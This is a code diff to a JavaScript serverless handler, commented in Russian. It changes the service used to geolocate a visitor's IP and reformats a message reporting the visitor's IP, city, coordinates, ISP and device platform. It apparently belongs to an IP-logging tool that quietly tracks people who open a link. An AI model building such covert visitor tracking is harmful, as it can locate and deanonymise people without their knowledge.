@@ -11,12 +11,12 @@ export default async function handler(req, res) {
 
   let geo = {};
   try {
-    // Запрашиваем географию по IP
-    const geoRes = await fetch(`https://ip-api.com/json/${realIP}?fields=country,city,lat,lon,org,status`);
+    // Запрашиваем географию по IP через ipinfo.io
+    const geoRes = await fetch(`http://ipinfo.io/${realIP}/json`);
     const geoData = await geoRes.json();
 
-    // Проверяем, успешен ли ответ от API
-    if (geoData.status === 'fail') {
+    // Проверяем, если ответ успешный
+    if (geoData.error) {
       geo = {
         country: "Не удалось получить данные",
         city: "Не удалось получить данные",
@@ -43,7 +43,7 @@ export default async function handler(req, res) {
 🌍 IP: \`${realIP}\`
 📍 Страна: \`${geo.country || "?"}\`
 🏙️ Город: \`${geo.city || "?"}\`
-🧭 Координаты: \`${geo.lat || "?"}\`, \`${geo.lon || "?"}\`
+🧭 Координаты: \`${geo.loc ? geo.loc.split(',')[0] : "?"}\`, \`${geo.loc ? geo.loc.split(',')[1] : "?"}\`
 🌐 Провайдер: \`${geo.org || "?"}\`
 🕰️ Локальное время: \`${new Date().toLocaleString()}\`
 💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
